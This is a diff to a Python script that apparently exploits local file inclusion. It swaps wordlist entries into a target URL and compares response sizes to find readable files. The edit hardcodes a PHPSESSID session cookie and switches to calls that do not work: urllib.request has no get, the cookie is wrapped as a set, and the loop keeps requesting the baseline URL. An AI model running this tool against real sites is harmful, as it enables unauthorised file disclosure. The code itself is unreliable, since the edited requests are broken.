@@ -1,5 +1,6 @@
 import sys
 from argparse import ArgumentParser
+from urllib import request
 from urllib.request import urlopen
 import time
 
@@ -23,10 +24,13 @@ def exploit_LFI():
     start = time.time()
     total_length = 0
     total_true = 0
-    
+
+    ## Check the default page size when nothing came out of the LFI
     random = "VQ328FEBWUBFI32BUI3BBF"
+    cookie = 'PHPSESSID=df0fe3eg8lrj22r0p0m6cgnpk4'
     URL = args.url.replace('LFI', random)
-    page = urlopen(URL)
+    page = request.get(URL,cookies={cookie})
+    #page = urlopen(URL,bytes(cookie))
     default_page = page.read()
     default_size = len(default_page)
 
@@ -35,7 +39,8 @@ def exploit_LFI():
     for line in f.readlines():
         total_length += 1
         url_var = url.replace('LFI', line)
-        page = urlopen(url_var)
+        #page = urlopen(url_var)
+        page = request.get(URL, cookies={cookie})
         content = page.read()
         if len(content) != default_size:
             total_true +=1
@@ -56,6 +61,7 @@ def exploit_LFI():
     final_info_print(total_length,total_true,duration)
 
 def clean_output(content,default_page):
+    ## function to only keep the LFI result and remove the value that are part of the website
     for line in default_page.splitlines():
         content = content.replace(line, '')
 
